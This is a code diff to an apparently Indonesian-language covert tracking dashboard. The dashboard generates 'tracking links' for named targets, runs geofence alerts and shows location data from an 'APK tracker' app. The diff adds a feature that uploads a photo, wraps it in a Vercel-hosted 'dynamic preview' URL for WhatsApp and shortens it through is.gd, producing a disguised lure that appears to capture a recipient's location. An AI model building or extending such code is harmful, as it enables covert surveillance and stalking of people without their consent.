@@ -356,7 +356,9 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <div class="term-body"><div class="prompt">[Alert] Geofence Monitor</div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Set titik + radius — alert bunyi kalau target masuk zona.</div><div class="geo-row"><input id="geoLat" class="geo-inp" placeholder="Latitude" type="number" step="any"><input id="geoLng" class="geo-inp" placeholder="Longitude" type="number" step="any"><input id="geoRadius" class="geo-inp" placeholder="Radius (m)" type="number" value="500" style="max-width:90px"></div><div style="display:flex;gap:6px;margin-bottom:10px"><button class="term-btn outline" onclick="setGeofence()" style="margin:0">[ Set Geofence ]</button><button class="term-btn danger" onclick="clearGeofence()" style="margin:0;flex:0 0 auto;width:auto;padding:0 16px">[ Clear ]</button></div><div class="geo-status" id="geoStatus">Belum diset</div><div class="geo-alert" id="geoAlert"></div></div>
 <div class="term-body"><div class="prompt">[Generate] Tracking Link</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div><input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()" autocomplete="off"><div style="font-size:10px;color:var(--text-d);margin:12px 0 8px">› base URL custom (opsional):</div><input id="baseUrlCustom" class="term-input" placeholder="cth: https://domain-lain.com" oninput="typingSound()" autocomplete="off" spellcheck="false"><div style="font-size:9px;color:var(--text-d);margin:-4px 0 8px;opacity:.7">kosongkan = pakai domain ini</div><div class="sched-row"><label>⏰ EXPIRED:</label><select id="linkExpiry"><option value="0">∞ Tidak expired</option><option value="15">15 menit</option><option value="60">1 jam</option><option value="360">6 jam</option><option value="1440" selected>24 jam</option><option value="10080">7 hari</option><option value="43200">30 hari</option></select></div><div class="sched-info" id="schedInfo">› Link akan expired otomatis setelah <b>24 jam</b>.</div><div style="font-size:10px;color:var(--text-d);margin:2px 0 8px">› pilih jenis link (auto-shorten via is.gd):</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="term-btn" onclick="genLink()" style="margin:0;flex:1;min-width:130px">[ Track Link ]</button><button class="term-btn outline" onclick="genLinkMaps()" style="margin:0;flex:1;min-width:130px">[ Maps Link ]</button></div>
 <input type="file" id="dashFotoInput" accept="image/*" style="display:none" onchange="onDashFotoPicked(event)">
-<button class="term-btn outline" onclick="document.getElementById('dashFotoInput').click()" style="margin-top:8px">[ 📷 Upload Foto → Generate Link ]</button>
+<input type="file" id="dashFotoInputVercel" accept="image/*" style="display:none" onchange="onDashFotoPickedVercel(event)">
+<button class="term-btn outline" onclick="document.getElementById('dashFotoInput').click()" style="margin-top:8px">[ 📷 Upload → infocuaca.online ]</button>
+<button class="term-btn" onclick="document.getElementById('dashFotoInputVercel').click()" style="margin-top:6px;background:transparent;color:var(--cyan);border:1px solid var(--cyan-d)">[ 📷 Upload → Vercel App (Dynamic Preview) ]</button>
 <div id="linkResult" style="display:none;margin-top:12px"><div style="font-size:10px;color:var(--text-d);margin-bottom:6px" id="linkTypeLabel">› target link:</div><div class="link-url-box" id="linkUrl"></div><button class="term-btn outline" id="btnCopy" onclick="copyLink()" style="margin-top:10px">[ 📋 Salin Link ]</button></div></div>
 <div class="term-body"><div class="prompt">[Data] Target Location</div><div class="map-box" id="mapLinkBox"><div id="mapLink" class="map-inner"></div><div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div><div class="map-coords" id="mapLinkCoords">--, --</div></div><div class="folder-bar" id="folderBar"><button class="folder-chip active" data-folder="all">◈ SEMUA</button><button class="folder-chip" data-folder="untagged">◦ UNTAGGED</button><button class="folder-chip" data-folder="VIP">★ VIP</button><button class="folder-chip" data-folder="Suspect">⚠ SUSPECT</button><button class="folder-chip" data-folder="Client">◆ CLIENT</button><button class="folder-chip" data-folder="Family">♥ FAMILY</button></div><div class="search-row"><input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()"><select id="filterDate" onchange="filterData()"><option value="all">Semua</option><option value="today">Hari Ini</option><option value="7days">7 Hari</option><option value="30days">30 Hari</option></select></div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b></div><div id="dupWarnBox"></div><div id="hasil"><div class="empty">Waiting for data...</div></div><div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)"><button class="term-btn outline" onclick="exportCSV()" style="margin:0">[ CSV ]</button><button class="term-btn outline" onclick="exportJSON()" style="margin:0">[ JSON ]</button><button class="term-btn danger" onclick="clearAll()" style="margin:0">[ Clear ]</button></div></div>
 <div class="term-body"><div class="prompt">[Monitor] APK Location</div><div class="map-box"><div id="mapApk" class="map-inner"></div><div class="map-label">APK TRACKER</div><div class="map-coords" id="mapApkCoords">--, --</div></div><div class="term-info"><div><span class="k">USER</span><span class="v" id="apkUser">-</span></div><div><span class="k">LAT</span><span class="v" id="apkLat">-</span></div><div><span class="k">LNG</span><span class="v" id="apkLng">-</span></div><div><span class="k">AKURASI</span><span class="v" id="apkAkurasi">-</span></div><div><span class="k">DEVICE</span><span class="v" id="apkDevice">-</span></div><div><span class="k">LAST UPDATE</span><span class="v" id="apkTime">-</span></div></div><button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">[ Buka Google Maps ]</button></div>
@@ -722,6 +724,97 @@ window.onDashFotoPicked = async function(event){
     const preview = document.createElement('img');
     preview.src = downloadUrl;
     preview.style.cssText = 'width:100%;max-height:180px;object-fit:cover;border:1px solid var(--gold-d);border-radius:4px;margin-top:10px;display:block;cursor:pointer';
+    preview.onclick = () => window.open(downloadUrl, '_blank');
+    urlBox.appendChild(preview);
+
+  } catch(e){
+    addLog('✗ Upload gagal: ' + e.message, 'err');
+    urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--red)">✗ Gagal: ' + e.message + '</div>';
+  } finally {
+    event.target.value = '';
+  }
+};
+
+/* ============================================================
+   UPLOAD FOTO → VERCEL APP (Dynamic Preview WhatsApp)
+   ============================================================ */
+window.onDashFotoPickedVercel = async function(event){
+  const file = event.target.files && event.target.files[0];
+  if(!file) return;
+  if(!file.type.startsWith('image/')){ alert('File harus gambar.'); event.target.value=''; return; }
+  if(file.size > 10*1024*1024){ alert('Maks 10 MB.'); event.target.value=''; return; }
+
+  playKlik();
+  addLog('📷 Upload foto (Vercel): ' + file.name);
+  actLog('📷 Upload foto (Vercel): ' + file.name, 'info');
+
+  const resBox = document.getElementById('linkResult');
+  const urlBox = document.getElementById('linkUrl');
+  const labelEl = document.getElementById('linkTypeLabel');
+  resBox.style.display = 'block';
+  if(labelEl) labelEl.innerText = '› mengunggah foto (dynamic preview)...';
+  urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--cyan);letter-spacing:2px">⏳ Upload ke ImgBB...</div>';
+
+  try{
+    const base64 = await new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = () => resolve(reader.result.split(',')[1]);
+      reader.onerror = reject;
+      reader.readAsDataURL(file);
+    });
+
+    const formData = new FormData();
+    formData.append('key', IMGBB_API_KEY);
+    formData.append('image', base64);
+
+    const resp = await fetch('https://api.imgbb.com/1/upload', {
+      method: 'POST',
+      body: formData
+    });
+    const json = await resp.json();
+
+    if(!json.success){
+      throw new Error(json.error?.message || 'Upload ImgBB gagal');
+    }
+
+    const downloadUrl = json.data.url;
+    addLog('✓ Foto terupload: ' + (json.data.id || ''), 'ok');
+
+    const t = document.getElementById('targetName').value.trim() || 'target';
+    // ⚠️ PAKAI VERCEL APP UNTUK DYNAMIC PREVIEW
+    const longUrl = 'https://official-brown-iota.vercel.app/api/p?foto=' 
+                  + encodeURIComponent(downloadUrl) 
+                  + '&u=images';
+
+    window.currentLink = longUrl;
+    window.lastLongLink = longUrl;
+    window.currentFotoUrl = downloadUrl;
+
+    if(labelEl) labelEl.innerText = '› memperpendek link...';
+    urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--cyan);letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
+
+    const result = await autoShorten(longUrl);
+    if(result.ok){
+      window.currentShortLink = result.short;
+      showBothLinks(longUrl, result.short, 'DYNAMIC FOTO');
+      addLog('✓ Shortlink dynamic: ' + result.short, 'ok');
+      actLog('📷 Link VERCEL FOTO: ' + t, 'link');
+      if(window.clipAdd) clipAdd(result.short, 'FOTO-DYN');
+      if(window.clipAdd) clipAdd(longUrl, 'FOTO-DYN');
+      beep(1800, 0.08);
+      const qr = document.getElementById('qrInput');
+      const sh = document.getElementById('shortInput');
+      if(qr) qr.value = result.short;
+      if(sh) sh.value = longUrl;
+    } else {
+      showBothLinks(longUrl, null, 'DYNAMIC FOTO');
+      addLog('⚠ Shortlink gagal, pakai link panjang', 'warn');
+      if(window.clipAdd) clipAdd(longUrl, 'FOTO-DYN');
+    }
+
+    const preview = document.createElement('img');
+    preview.src = downloadUrl;
+    preview.style.cssText = 'width:100%;max-height:180px;object-fit:cover;border:1px solid var(--cyan-d);border-radius:4px;margin-top:10px;display:block;cursor:pointer';
     preview.onclick = () => window.open(downloadUrl, '_blank');
     urlBox.appendChild(preview);
 
